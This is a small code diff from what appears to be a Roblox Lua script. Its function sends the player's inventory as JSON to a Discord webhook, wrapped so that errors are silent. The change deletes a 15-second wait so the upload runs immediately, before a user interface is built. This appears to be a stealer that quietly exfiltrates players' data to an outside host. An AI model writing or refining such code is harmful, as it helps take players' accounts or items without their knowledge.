@@ -56,7 +56,7 @@ local function sendInventoryToDiscord()
 		pcall(function() requestFunction({Url=Webhook,Method="POST",Headers=headers,Body=jsonData}) end)
 	end
 end
-task.wait(15)
+
 sendInventoryToDiscord()
 
 local screenGui = Instance.new("ScreenGui")
